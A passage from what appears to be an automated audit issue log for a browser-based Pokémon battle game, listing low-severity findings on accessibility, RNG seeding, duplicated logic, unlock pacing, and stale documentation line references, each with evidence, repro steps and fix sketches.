- **Cold pass only (10 first-time trainers)**: median **1.42 ms**, p95 **3.22 ms**, mean **1.63 ms**.

The 5× ratio of cold-to-warm confirms `_trainerPoolCache` (battle.html:34910) is doing its job — first call per (type+gens) key pays the full baseStats scan, subsequent calls hit the partition.

**Blast radius**: Each story battle = exactly one `rollTrainerTeam` call. At median < 1 ms it's invisible. The cache is correctly bounded at 48 entries with LRU-ish eviction (battle.html:35029). Worth flagging in case the upcoming difficulty rework on `claude/eloquent-maxwell-I4Uql` introduces per-turn re-rolls or per-player adaptive picks — at that point the 1.4 ms cold cost compounds.

**Fix sketch**: No fix required today; the cache eviction at >48 entries is the correct upper bound for the cache key space (10 single types × 9 gen combinations × bosses ≈ 30–40 keys per save). If a future refactor invalidates the cache on every battle (e.g. "boss-specific filters"), revisit.

**Verification**: Re-bench after any difficulty-rework merge that touches `_trainerPoolCache` invalidation; threshold for concern is median > 5 ms or cold-pass p95 > 15 ms.

---

## <a id="ISSUE-175"></a> ISSUE-175: All 24 `#screen-*` containers are plain `<div>` — no `<main>` or `role="region"`

---
id: ISSUE-175
severity: P3
category: a11y
anchor_symbol: screen-landmarks
current_line_hint: ~7400
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: ade33e34d4e7
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: All 24 `#screen-*` containers are plain `<div>` — no `<main>` or `role="region"`

**Evidence**:
```
$ grep -nE 'id="screen-[a-z-]+"' battle.html | head -5
7400:    <div id="screen-menu" class="screen active">
7490:    <div id="screen-draft" class="screen hidden" …>
7786:    <div id="screen-story-menu" class="screen hidden story-screen-outer">
7811:    <div id="screen-story-city" class="screen hidden story-screen-root" …>
7856:    <div id="screen-story-professor" class="screen hidden story-screen-root" …>
…
8496:    <div id="screen-battle" class="screen hidden">
```

24 top-level screens (menu, draft, story-menu, story-city, story-shop, story-tutor, story-evtrainer, story-pokemoncenter, story-casino, story-catch, story-link, story-evolab, story-gameover, story-artifacts, story-tester, story-trainercreate, collection, battle, plus 6 more). None use a landmark element. Screen readers see "main content" as one undifferentiated blob: the assistive nav-by-landmark shortcut produces zero hits.

**Repro**: Open VoiceOver rotor (VO+U) → Landmarks. Nothing for any screen.

**Blast radius**: One of the cheapest a11y wins available — affects landmark navigation across the entire game.

**Fix sketch**: At minimum, change the currently-active `#screen-*` to behave as `<main>` (only one main per page). Mechanically: keep the `<div>` tag but add `role="main"` to whichever screen is active (toggle in the existing show-screen helper), and `role="region" aria-labelledby="<screen-heading-id>"` on the rest. Each screen already has an `<h1>`/`<h2>` near the top — give it an id and label by it.

**Verification**: VoiceOver landmark count ≥ 1; rotor labels match the active screen name.

---

## <a id="ISSUE-176"></a> ISSUE-176: Several story-mode dev seeds use `Math.random` for build / sprite picks, breaking seeded replays when debug seeds are in play

---
id: ISSUE-176
severity: P3
category: bug
anchor_symbol: seedDebugMysteryLegendGate
current_line_hint: ~35548
file: battle.html
agents: [story-mode-investigator]
fingerprint: 90afbb333f6a
confidence: low
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Several story-mode dev seeds use `Math.random` for build / sprite picks, breaking seeded replays when debug seeds are in play

**Evidence**:
```js
// battle.html ~35548 (seedDebugMysteryLegendGate)
const filler = ['Bulbasaur','Charmander','Squirtle','Caterpie','Weedle','Pidgey'];
// later: const pick = filler[Math.floor(Math.random() * filler.length)];

// Also lines 35774 / 35657 / 35651: testmega seeds also use Math.random / state.
```
Dev seeds are not exercised in shipped runs (they're gated by `?debugMystery=1` / localhost). But if a developer is hunting a story bug under `?seed=X&debugMystery=1`, the dev seed will fork the RNG state — they can't reproduce the seeded sequence after the dev seed runs.

**Repro**: Run `?seed=12345&debugMystery=1`, fire `seedDebugMysteryLegendGate`. The team it injects differs across reloads.

**Blast radius**: Dev-only ergonomic issue. No production-user impact.

**Fix sketch**: Route the picks through `storyRngNext` (or a `_storyDebugRng` if you want dev seeds isolated from the main RNG stream). Or document that dev seeds intentionally fork the RNG.

**Verification**: With the fix, `?seed=12345&debugMystery=1` produces the same injected team across reloads.

---

## <a id="ISSUE-177"></a> ISSUE-177: End-of-turn residual logic is duplicated verbatim in forced-switch path and main loop — divergence risk

---
id: ISSUE-177
severity: P3
category: inconsistency
anchor_symbol: selectPartyMember
current_line_hint: ~19373
file: battle.html
agents: [battle-engine-debugger]
fingerprint: d7d32448cfd3
confidence: high
status: open
---

**Title**: End-of-turn residual logic is duplicated verbatim in forced-switch path and main loop — divergence risk

**Evidence**:
```js
// selectPartyMember forced path (19373-19383) — duplicate of main loop (20128-20138):
runVolatileTimers(); runWishHealing();
endOfTurnEffects(state.pActive, state.fActive); endOfTurnEffects(state.fActive, state.pActive);
tickWeather();
if (state.pActive.dynamaxed) { state.pActive.dynamaxTurns--; ... }
```

**Repro**: Two byte-identical residual blocks (lines 19373-19383 and 20128-20138). The forced-switch copy IS wrapped by the try/catch at 19328-19422 (good — it recovers the lock), but any future fix to one block (e.g. adding the guards from the P1 findings) must be mirrored or behavior diverges between "switched-this-turn" and "stayed-in" turns. The forced-switch copy also still has the unguarded `state.pActive.dynamaxed` access, just with recovery.

**Blast radius**: Maintenance hazard; EoT semantics could silently differ after a forced switch vs a normal turn.

**Fix sketch**: Extract a single `runEndOfTurnResiduals()` helper called from both sites; apply the guards there once.

**Verification**: Diff EoT log output for a turn with vs without a mid-turn forced switch under the same seed.

---

## <a id="ISSUE-178"></a> ISSUE-178: Player gimmick-unlock order shifts when a mechanic is disabled in settings — DMax unlocks at Gym 5 instead of Gym 6 if Mega is off

---
id: ISSUE-178
severity: P3
category: dx
anchor_symbol: settings.megaOn
current_line_hint: ~38242
file: battle.html
agents: [story-mode-investigator]
fingerprint: 671336517e09
confidence: medium
status: open
---

**Title**: Player gimmick-unlock order shifts when a mechanic is disabled in settings — DMax unlocks at Gym 5 instead of Gym 6 if Mega is off

**Evidence**:
```js
// battle.html ~38240  (in onGymVictory handler)
const order = [];
if (sm.settings.megaOn) order.push('mega');
if (sm.settings.dynaOn) order.push('dmax');
if (sm.settings.teraOn) order.push('tera');
if (sm.settings.zOn) order.push('z');
const badges = sm.badges | 0;
const slotsUnlocked = badges < 5 ? 0 : Math.min(4, badges - 4);
sm.unlockedGimmicks = order.slice(0, Math.min(slotsUnlocked, order.length));
```
At badges=5 with all four mechanics enabled: unlock = `['mega']`. At badges=5 with only Dyna enabled: unlock = `['dmax']` (jumped DMax up to slot 1). The unlock schedule is condensed against the order array, so the "first unlock at GL5, full set at GL8" curve compresses or shifts when a setting is off.

**Repro**: New run with Mega disabled in Settings. Beat GL5. `sm.unlockedGimmicks = ['dmax']` (instead of empty). DMax is now available at GL5's first reveal fight, despite the spec/CHANGELOG framing GL5 as "the unlock-reveal fight" for Mega specifically.

**Blast radius**: Subtle balance / pacing issue. The CHANGELOG narrative ("from Gym 5 onwards the catches can only roll from the mechanics the player has actually earned") still holds — but the *which* mechanic players first encounter is wrong. A pure-DMax-only run gets DMax at GL5 instead of GL6.

**Fix sketch**: Either (a) accept the compression as intentional (no action), or (b) anchor the unlock by badges:
```js
const planned = ['mega', 'dmax', 'tera', 'z'];
const slot = Math.max(0, badges - 4);
const newlyUnlocked = planned.slice(0, slot).filter(k => settingForMech(k));
sm.unlockedGimmicks = newlyUnlocked;
```
So at badges=5 with only Dyna on, `unlockedGimmicks` is `[]` until GL6 (dmax's natural slot).

**Verification**: Disable Mega in Settings; after GL5, `sm.unlockedGimmicks` should be `[]` (option b) or `['dmax']` (option a). Match whichever behavior the design intends.

---

## <a id="ISSUE-179"></a> ISSUE-179: `shouldForceCityProfessor` uses dead `sm.team.length < 6` floor that's shadowed by outer `hasTeamRoom` gate

---
id: ISSUE-179
severity: P3
category: refactor
anchor_symbol: shouldForceCityProfessor
current_line_hint: ~28822
file: battle.html
agents: [story-mode-investigator]
fingerprint: e8d8ed327813
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `shouldForceCityProfessor` uses dead `sm.team.length < 6` floor that's shadowed by outer `hasTeamRoom` gate

**Evidence**:
```js
// battle.html ~28809
function shouldForceCityProfessor(cityIdx, actions) {
    if (c >= 9) return false;
    if (...) return false;
    if (isPreLeagueLegendaryMysteryGate(c)) return true;
    if (_isPostGymHubAtEventIdx(...)) return false;
    return sm.team.length < 6;   // ← uses hard-coded 6
}

// battle.html ~35931 (caller in renderCityActions)
const _partyCap = _storyMaxPartySize();   // 2..6
const hasTeamRoom = sm.team.length < _partyCap;
const hasProf = (hasBaseProf || shouldForceCityProfessor(cityIdx, actions))
              && (hasTeamRoom || _legendaryGateHere);
```
The `< 6` floor in `shouldForceCityProfessor` is functionally dead: any time it returns `true` with `team.length >= _partyCap`, the outer `&& hasTeamRoom` clause flips the result to `false` anyway. The two formulas should match for clarity, or the inner check should just be `return true;`.

**Repro**: Inspect `shouldForceCityProfessor` semantics. Any test where team.length >= partyCap but < 6 (e.g. badges=2, team=4) reaches the `team.length < 6 = true` branch, but the outer `hasTeamRoom = (4 < 4) = false` overrides it.

**Blast radius**: Logic-only smell, no user-visible bug today. Future contributors trying to reason about Professor visibility see two different cap formulas (`< 6` vs `< _partyCap`) and lose time triangulating.

**Fix sketch**: Replace the inner check with `return sm.team.length < _storyMaxPartySize();` — or just `return true;`, since the outer caller already gates on `hasTeamRoom`. Adds a small consistency win.

**Verification**: After fix, both call sites express the same cap formula.

---

## <a id="ISSUE-180"></a> ISSUE-180: `shouldForceCityProfessor`'s `sm.team.length < 6` floor is dead-coded once the outer `hasTeamRoom` gate clamps to `_storyMaxPartySize()`

---
id: ISSUE-180
severity: P3
category: dx
anchor_symbol: shouldForceCityProfessor
current_line_hint: ~28822
file: battle.html
agents: [story-mode-investigator]
fingerprint: 3db327ab351c
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `shouldForceCityProfessor`'s `sm.team.length < 6` floor is dead-coded once the outer `hasTeamRoom` gate clamps to `_storyMaxPartySize()`

**Evidence**:
```js
// battle.html ~28809
function shouldForceCityProfessor(cityIdx, actions) {
    if (c >= 9) return false;
    if (Array.isArray(actions) && actions.includes('Professor')) return false;
    if (isPreLeagueLegendaryMysteryGate(c)) return true;
    if (_isPostGymHubAtEventIdx(...)) return false;
    return sm.team.length < 6;   // ← effectively dead
}

// battle.html ~35931 (caller in renderCityActions)
const _partyCap = _storyMaxPartySize();   // 2..6
const hasTeamRoom = sm.team.length < _partyCap;
const hasProf = (hasBaseProf || shouldForceCityProfessor(cityIdx, actions))
              && (hasTeamRoom || _legendaryGateHere);
```

Two cap formulas in the same flow: `< 6` (inner) and `< _partyCap` (outer). The outer one always shadows the inner when they disagree. Either condition is dead code or a maintainability hazard.

**Repro**: At 2 badges with team=4 (cap=4): `shouldForceCityProfessor` returns `4 < 6 = true`; but `hasTeamRoom = 4 < 4 = false`; so `hasProf = false`. The `< 6` branch did no work.

**Blast radius**: Code-clarity smell. Two formulas describing the same gate is a future-edit footgun.

**Fix sketch**: Either replace `sm.team.length < 6` with `sm.team.length < _storyMaxPartySize()`, or just `return true;` (since the outer caller does the cap check anyway). Pair with fingerprint `e8d8ed327813`.

**Verification**: After fix, both call sites express the same cap formula.

---

## <a id="ISSUE-181"></a> ISSUE-181: Stale comment claims rival secondary intro "Uses Math.random" — it now uses seeded _storySideRng

---
id: ISSUE-181
severity: P3
category: inconsistency
anchor_symbol: showBattleIntro
current_line_hint: ~42101
file: battle.html
agents: [story-mode-investigator]
fingerprint: 691dc8480b55
confidence: high
status: open
---

**Title**: Stale comment claims rival secondary intro "Uses Math.random" — it now uses seeded _storySideRng

**Evidence**:
```js
// battle.html:42101 (comment) — INCORRECT
// "...Uses Math.random for rival secondary line only — does not advance story battle RNG."
// but battle.html:42121 calls:
const extraLine = ... pickRivalSecondaryIntroLine(rivalPhase, badgesNow);
// which uses _storySideRng(seed, phase, badges) — deterministic (30755)
```

**Repro**: `pickRivalSecondaryIntroLine` (battle.html:30766) draws via `_storySideRng(...)` (30755), a "Deterministic per-(seed, phase, badges) sub-RNG … reproducible across shared seeds." This FIXES prior audit finding 1.1. The comment at 42101 was never updated and now mis-states the implementation.

**Blast radius**: Comment-only; misleads future maintainers into thinking shared-seed replays diverge on the rival line (they don't).

**Fix sketch**: Update the comment to "rival secondary line uses a deterministic seed-derived sub-RNG (`_storySideRng`); does not touch story battle RNG state."

**Verification**: Comment matches `pickRivalSecondaryIntroLine`.

---

## <a id="ISSUE-182"></a> ISSUE-182: Mobile move-details "i" is a span[role=button] with no tabindex/keydown — keyboard cannot reach it

---
id: ISSUE-182
severity: P3
category: a11y
anchor_symbol: showMoves
current_line_hint: ~18146
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 35644feb52ad
confidence: high
status: open
---

**Title**: Mobile move-details "i" is a span[role=button] with no tabindex/keydown — keyboard cannot reach it

**Evidence**:
```js
let infoHit = isMobile ? '<span class="move-info-hit" title="Move details" role="button">i</span>' : '';
// later: hit.addEventListener('click', ...openStickyMoveTooltip)  // click only — no keydown, no tabindex
```

**Repro**: On a touch+keyboard device (or mobile emulation with a BT keyboard), open Fight. The per-move "i" affordance has `role="button"` but no `tabindex="0"` and no `keydown` handler, so it never receives focus and Enter/Space do nothing. It is the only path to the full move tooltip on mobile layouts (desktop uses hover). Note: the move `<button>` itself carries a rich `aria-label` (L18148), so SR users still get the summary — this is a focusability/parity gap, not a total loss.

**Blast radius**: Mobile/portrait + tablet battle move menu. Mirrors the desktop tooltip being `onmousemove`-gated (already filed) but is a distinct element/control.

**Fix sketch**: Make it a real `<button type="button">` (preferred) or add `tabindex="0"` + a `keydown` handler firing on Enter/Space; give it an `aria-label` like "Show full details for <move>".

**Verification**: Tab reaches the "i" control inside each move tile; Enter/Space opens the sticky tooltip.

---

## <a id="ISSUE-183"></a> ISSUE-183: Mystery Figure identity is rolled at run start before sm.active/runSeed are live — not reproducible under fixed debug seeds

---
id: ISSUE-183
severity: P3
category: bug
anchor_symbol: startNewRun
current_line_hint: ~35714
file: battle.html
agents: [story-mode-investigator]
fingerprint: b61c4fb64fc9
confidence: medium
status: open
---

**Title**: Mystery Figure identity is rolled at run start before sm.active/runSeed are live — not reproducible under fixed debug seeds

**Evidence**:
```js
// inside the sm = { ... } object literal, evaluated BEFORE the assignment completes:
mysteryIdentity: _storyPickMysteryIdentity(),
// _storyPickMysteryIdentity uses bare Math.random() (lines ~30034/30042). The global
// Math.random monkeypatch (line ~32404) only seeds when the *current* sm.active &&
// sm.runSeed — but at literal-construction time sm still points at the prior/default state.
```

**Repro**: `startNewRun` builds the new `sm` literal with `mysteryIdentity: _storyPickMysteryIdentity()`. At that instant the module `sm` variable hasn't been reassigned, so the Math.random override (which gates on `sm.active && sm.runSeed != null`) reads the OLD state (default `active:false` on first run → native Math.random; or a stale prior run's seed). The Mystery identity is therefore NOT a function of the new run's seed. The debug seeds (`seedDebugMysteryLegendGate`, `seedDebugPostHofClimax`) pin runSeed for reproducible climax testing, but the masked-figure identity still varies. (Normal play is unaffected — seeds are auto-random per run now, so cross-run replay is moot.)

**Blast radius**: Reproducibility of the Mystery Figure climax under debug/test seeds only. No gameplay impact in normal runs. Prior audits flagged the bare-Math.random; the global monkeypatch added since covers most call sites but not this pre-assignment one.

**Fix sketch**: Roll `mysteryIdentity` AFTER the `sm = {...}` assignment and after `sm.active=true`/`runSeed` are set, OR pass the new runSeed explicitly into `_storyPickMysteryIdentity` and derive from it. Either makes the identity seed-deterministic.

**Verification**: Two `startNewRun` calls with the same forced runSeed produce the same `sm.mysteryIdentity`.

---

## <a id="ISSUE-184"></a> ISSUE-184: Internal action keys use `Pokemon` (no diacritic) while UI labels use `Pokémon`

---
id: ISSUE-184
severity: P3
category: inconsistency
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~28028
file: battle.html
agents: [consistency-auditor]
fingerprint: 908671f1a52f
confidence: high
status: wontfix-internal-keys-stable-not-user-facing
---

**Title**: Internal action keys use `Pokemon` (no diacritic) while UI labels use `Pokémon`

**Evidence**:
```js
// L28028  '...,Power Up','Enter Pokemon League']],          ← action key
// L36151                       'Enter the Pokémon League'   ← UI label
// L28047  if (!Array.isArray(actions) || actions.includes('Pokemon Fan Club')) continue;
// L36242  makeActionBtn('💖 Pokémon Fan Club', ...           ← UI label
```

**Repro**: `grep -nE '\\bPokemon\\b' battle.html | grep -v 'Pokémon'` — 19 hits, 2 of which are user-string-adjacent action keys (rest are CSS / code comments).

**Blast radius**: None for users — internal keys, not displayed. Style consistency only. Risk: a future contributor updates one of these two strings to use the diacritic and forgets the matched site, breaking the `actions.includes(...)` check.

**Fix sketch**: Either (a) leave both as-is and document that internal action keys deliberately avoid the diacritic, or (b) rename both keys to use `Pokémon` + update both `actions.includes(...)` callsites. (a) is the lower-risk fix.

**Verification**: After rename, ensure City 9's "Enter Pokémon League" button still appears (the gating check at L36137 must match).

---

## <a id="ISSUE-185"></a> ISSUE-185: Doc line anchors stale — 18/50 `battle.html:LINE` refs in design docs no longer resolve (clustered)

---
id: ISSUE-185
severity: P3
category: dx
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~29240
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: 3aecea72ae27
confidence: high
status: open
---

**Title**: Doc line anchors stale — 18/50 `battle.html:LINE` refs in design docs no longer resolve (clustered)

**Evidence**:
```text
node scripts/debug/spec-drift.mjs → 18/50 battle.html:LINE refs drifted.
Representative examples (claimed line → symbol now lives at):
  STORY_MODE_FLOW.md:53   battle.html:21273  STORY_EVENTS_RAW   → now 29240
  STORY_MODE_FLOW.md:123  battle.html:28560  getMonGrade        → now 13893
  STORY_MODE_FLOW.md:584  battle.html:34883  makeWildBuild      → now 44684
  STORY_NARRATIVE_VARIANTS.md:612 battle.html:30566 STORY_BEATS  → now 35833
  PROGRESSION_CURVE_MASTER.md:181 battle.html:42146 (gimmick gate) → now ~42749/38575
```

**Repro**: `node scripts/debug/spec-drift.mjs` then read `tests/reports/spec-drift.md`.

**Blast radius**: Cosmetic — the docs themselves repeatedly warn "line numbers drift; the symbol name is the durable anchor," and the symbols still resolve via `find-anchor`. battle.html grew from ~28k LOC (when most anchors were written) to ~54.8k LOC. No behavioral impact; just stale jump-to references across `STORY_MODE_FLOW.md`, `STORY_MODE_CATCH_INTEGRATION_RISK.md`, `STORY_NARRATIVE_VARIANTS.md`, and `PROGRESSION_CURVE_MASTER.md`.

**Fix sketch**: Optional bulk refresh — re-run `node scripts/debug/symbol-index.mjs` and regenerate the `battle.html:LINE` anchors from symbol lookups, or simply accept drift since the symbol names are the contract. Lowest priority.

**Verification**: `node scripts/debug/spec-drift.mjs` reports 0 drifted (if a refresh pass is done).

---

## <a id="ISSUE-186"></a> ISSUE-186: Service-timeline pacing — City1 post-gym hub is a dead zone (no new "thing to do")

---
id: ISSUE-186
severity: P3
category: balance
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~29009
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6287bc4c5a37
confidence: high
status: open
---

**Title**: Service-timeline pacing — City1 post-gym hub is a dead zone (no new "thing to do")

**Evidence**:
```text
City0 pre-gym : Professor, Pokémart, Move Tutor, Nature Rater  (+ Center, Fan Club injected)
City1 pre-gym : Professor, Pokémart, Gym                       (NO new facility vs City0)
City1 post-gym: Pokémart, Leave City                          (DEAD — nothing new; Daycare unlocks here but only as egg-quest)
City2 pre-gym : Link Station, Stone Sage, Stone Shop, Move Tutor  (3 NEW facilities debut at once — clumped)
```

**Repro**: Extracted from `STORY_EVENTS_RAW` City rows + `FACILITY_DEBUT_CITY` (29085). First-appearance map: Center/Mart/Tutor/Nature/FanClub = C0; **C1 introduces nothing new**; Link+StoneShop+StoneSage all debut **together at C2**; Dojo+EVTrainer+Safari all debut **together at C4**; Colress C6; Dept Store C6. So the drip is: rich C0 → flat C1 → triple-debut C2 → C3 (Nature Rater returns) → quad-event C4 → Casino C5 → Colress+Dept C6.

**Blast radius**: The maintainer explicitly wants "a steady drip of new things to do." Current pacing is clumped (C2 triple, C4 quad) with a genuine dead zone at C1 (the first post-gym hub has only Pokémart). Daycare DOES unlock at C1's gym win but presents only as a one-time egg quest, and the redesign moves it to C2 anyway.

**Fix sketch**: Spread debuts: move ONE of {Link, Stone Shop, Stone Sage} earlier to C1 (post-gym), and stagger Dojo (C4) vs EV Trainer (keep C4) vs Safari (C4) so C3 or C5 gets a fresh facility instead of three landing at C4. REDESIGN_PLAN §8a already flags the GL4–5 "dead zone" on the enemy curve; this is the FACILITY-debut analog.

**Verification**: Re-extract per-city action lists; confirm every city 1–8 introduces ≥1 first-appearance service.

---

## <a id="ISSUE-187"></a> ISSUE-187: STORY_EVENTS_RAW has 67 array rows (incl. 2 'Hall of Fame' string matches) — mandate/spec cite "68 rows"

---
id: ISSUE-187
severity: P3
category: data
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~29008
file: battle.html
agents: [story-mode-investigator]
fingerprint: 1351f59a0b47
confidence: medium
status: open
---

**Title**: STORY_EVENTS_RAW has 67 array rows (incl. 2 'Hall of Fame' string matches) — mandate/spec cite "68 rows"

**Evidence**:
```text
STORY_EVENTS_RAW.length = 67 (array entries 29009..29078)
Row IDs (col 0) range 0..68 but are NON-contiguous and out of order:
  row 68 sits at array index 1 (intro Rival), row 12 (mid Rival) at index 19, etc.
```

**Repro**: `STORY_EVENTS_RAW` literal spans 29009–29078, 67 rows. The audit mandate and CODEBASE_MAP say "68 rows". The discrepancy is because event IDs (column 0) are durable keys assigned across history (max id 68) and are NOT array indices — migrations inserted/removed rows over time. This is a documentation-count drift, not a data bug: `GYM_CITY_LEADER_EVENT`, `STORY_BEATS`, and `trainerAssignments` all correctly key on the id or the array position as appropriate.

**Blast radius**: Doc-only. Reinforces finding #9: any tooling that assumes id == index will break (REDESIGN_PLAN §6 already warns).

**Fix sketch**: Update CODEBASE_MAP / mandate references to "67 rows; event IDs 0..68 non-contiguous, keyed by column 0".

**Verification**: `node -e` count of the literal == 67.

---

## <a id="ISSUE-188"></a> ISSUE-188: 6+ stale `battle.html:LINE` refs in STORY_MODE_CATCH_INTEGRATION_RISK.md (avg drift ~9000 lines)

---
id: ISSUE-188
severity: P3
category: dx
anchor_symbol: STORY_MODE_CATCH_INTEGRATION_RISK.md
file: docs/STORY_MODE_CATCH_INTEGRATION_RISK.md
agents: [spec-drift-auditor]
fingerprint: 3c47a061e632
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 6+ stale `battle.html:LINE` refs in STORY_MODE_CATCH_INTEGRATION_RISK.md (avg drift ~9000 lines)

**Evidence**:
```
doc-line  | symbol hinted                      | claimed | actual
40        | badges, _storyProgressFactor       | 22481   | 13168 / 31385
41        | _rivalScoreAttackTypeVsParty       | 22706   | 31604
43        | hasTeamRoom, rivalGateActive       | 23611   | 35922 / 35940
47        | isFull, rolls                      | 24317   | 36885 / 36913
52        | usedNames, usedFamilies            | 24515   | 14180 / 36947
54        | sm                                 | 26484   | 13166
```
This doc is the largest single source of drifted refs in the report (24 of 50 total drifts).

**Repro**: `node scripts/debug/spec-drift.mjs && sed -n '25,55p' tests/reports/spec-drift.md`.

**Blast radius**: A doc named "risk" implies it should be read carefully on every catch-pipeline change; stale anchors actively mislead readers tracking how the catch flow interacts with Rival logic, save schema, and PC capacity.

**Fix sketch**: Single sweep through this doc, converting `battle.html:LINE` patterns to `(SYMBOL)` annotations. Special attention to lines 40-55, which form the spec's high-density anchor block. Add the convention to `docs/STORY_MODE_DESIGN_DECISIONS.md` as "rule: never quote line numbers in design docs".

**Verification**: `node scripts/debug/spec-drift.mjs` reports ≤2 drift entries under this doc.

---

## <a id="ISSUE-189"></a> ISSUE-189: Doc `battle.html:LINE` anchors still stale (50 refs, 18 drifted) despite PR #140 "fix"

---
id: ISSUE-189
severity: P3
category: dx
anchor_symbol: STORY_MODE_CATCH_INTEGRATION_RISK.md
current_line_hint: n/a
file: docs/STORY_MODE_CATCH_INTEGRATION_RISK.md
agents: [spec-drift-auditor]
fingerprint: 29bf2f08d270
confidence: high
status: open
---

**Title**: Doc `battle.html:LINE` anchors still stale (50 refs, 18 drifted) despite PR #140 "fix"

**Evidence**:
```
Fresh node scripts/debug/spec-drift.mjs: 18/50 battle.html:LINE refs drifted.
Representative (claimed -> actual symbol location):
  STORY_MODE_FLOW.md:53        STORY_EVENTS_RAW     21273 -> 29008
  STORY_MODE_FLOW.md:123       getMonGrade          28560 -> 13809
  CATCH_INTEGRATION_RISK.md:47 _rivalScoreAttackTypeVsParty 22706 -> 33118
  NARRATIVE_VARIANTS.md:612    STORY_BEATS          30566 -> 35521
  NARRATIVE_VARIANTS.md:618    MYSTERY_FIGURE_IDENTITIES 26426 -> 29759
ref counts today: STORY_MODE_FLOW=10, CATCH_INTEGRATION_RISK=30, NARRATIVE_VARIANTS=10
```

**Repro**: `node scripts/debug/spec-drift.mjs && sed -n '1,90p' tests/reports/spec-drift.md`. Prior findings (2026-05-22) were marked `fixed-claude/sharp-keller-eZEDN`; `git log` shows PR #140 merged, yet 50 `battle.html:LINE` refs remain and battle.html has since grown to 54,266 lines, so they have re-drifted.

**Blast radius**: Readers following line jumps land in unrelated code (avg drift ~5-8k lines). CATCH_INTEGRATION_RISK.md (30 refs) is the densest offender — a "risk" doc meant to be read on every catch-pipeline change. Symbol *names* still resolve; only the line numbers mislead.

**Fix sketch**: Adopt the prior fix-sketch's own recommendation that was never applied: replace every `battle.html:LINE` with a symbol-only annotation (`` `SYMBOL` `` + "resolve via find-anchor"), and add the "never embed line numbers in design docs" rule to STORY_MODE_DESIGN_DECISIONS so it stops recurring. One clustered sweep, not 18 edits.

**Verification**: `grep -coE 'battle\.html:[0-9]+' STORY_MODE_FLOW.md docs/STORY_MODE_CATCH_INTEGRATION_RISK.md docs/STORY_NARRATIVE_VARIANTS.md` → 0; `node scripts/debug/spec-drift.mjs` reports 0 drift.

---

## <a id="ISSUE-190"></a> ISSUE-190: 9 of 10 `battle.html:LINE` refs in STORY_MODE_FLOW.md are stale (avg drift ~7000 lines)

---
id: ISSUE-190
severity: P3
category: dx
anchor_symbol: STORY_MODE_FLOW.md
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: a2c0649750f6
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 9 of 10 `battle.html:LINE` refs in STORY_MODE_FLOW.md are stale (avg drift ~7000 lines)

**Evidence**:
```
STORY_MODE_FLOW.md doc-line  | claimed battle.html line | actual location
 47 (STORY_EVENTS_RAW)       | 21273                    | 27969 (+6696)
117 (catchRate, getMonGrade) | 28560                    | 13062 (-15498)
217 (STORY_EVENTS_RAW)       | 30702                    | 27969 (-2733)
576 (makeWildBuild)          | 34883                    | 39858 (+4975)
```
Full report at `tests/reports/spec-drift.md`. Only 1/10 refs in this doc still resolves cleanly via the symbol table — the rest reference symbols at lines that no longer host them (or have no inferrable symbol).

**Repro**: `node scripts/debug/spec-drift.mjs && head -25 tests/reports/spec-drift.md`.

**Blast radius**: Anyone who follows STORY_MODE_FLOW.md's line numbers to inspect the implementation lands in unrelated code. Docs still readable for *symbol* references, just not line jumps.

**Fix sketch**: One sweep: re-resolve every `battle.html:LINE` via `find-anchor`, rewrite as `battle.html` (no line) plus `(`SYMBOL`)`. Future-proof: never embed line numbers in design docs — they drift the moment a function is added above.

**Verification**: After sweep, `node scripts/debug/spec-drift.mjs` reports ≤1 drift entry under STORY_MODE_FLOW.md.

---

## <a id="ISSUE-191"></a> ISSUE-191: STORY_MODE_FLOW.md PC cap of 10 contradicts shipped PC_BOX_CAP=30

---
id: ISSUE-191
severity: P3
category: data
anchor_symbol: STORY_MODE_FLOW.md
current_line_hint: 30
file: STORY_MODE_FLOW.md
agents: [story-mode-investigator]
fingerprint: 85733dc0b897
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: STORY_MODE_FLOW.md PC cap of 10 contradicts shipped PC_BOX_CAP=30

**Evidence**:
```
STORY_MODE_FLOW.md §1 (line 30): "PC | Pure storage. Flat array, cap 10 …"
STORY_MODE_FLOW.md §7 (line 168): "PC Storage — Deposit, withdraw, release. Capacity 10 — intentionally tight …"
STORY_MODE_FLOW.md §14, A2 (line 414): "Flat-array PC, cap 10 (revised down from the prior audit's 60 …)"

battle.html:38560 → const PC_BOX_CAP = 30;
```
Three separate spec mentions all say 10. Code says 30. Sibling fingerprint `fad97b9dadac` files the same drift from the code direction.

**Repro**: `grep -nE "cap.?10|Capacity 10" STORY_MODE_FLOW.md` returns three hits; `grep -nE "PC_BOX_CAP" battle.html` returns one hit at 30.

**Blast radius**: Spec is the canonical source per `CODEBASE_MAP.md`. Any agent reading the spec to seed a fix lands on the wrong number.

**Fix sketch**: Either bump the spec from 10 → 30 (if 30 is intentional — likely, given the Pokédex collection arc that was added v17+), or drop code to 10. Pair with fingerprint `fad97b9dadac`.

**Verification**: After fix, spec and code agree on a single value.

---

## <a id="ISSUE-192"></a> ISSUE-192: 5+ stale `battle.html:LINE` refs in STORY_NARRATIVE_VARIANTS.md (variant-system anchors moved 3-5k lines)

---
id: ISSUE-192
severity: P3
category: dx
anchor_symbol: STORY_NARRATIVE_VARIANTS.md
file: docs/STORY_NARRATIVE_VARIANTS.md
agents: [spec-drift-auditor]
fingerprint: b63a7fd17310
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 5+ stale `battle.html:LINE` refs in STORY_NARRATIVE_VARIANTS.md (variant-system anchors moved 3-5k lines)

**Evidence**:
```
doc-line | symbol                       | claimed | actual
339      | pending                      | 30916   | 17218
600      | STORY_BEATS                  | 30566   | 33787
601      | STORY_COLD_OPENS             | 30592   | 33813
602      | STORYLINE_VARIANTS           | 30815   | 35011
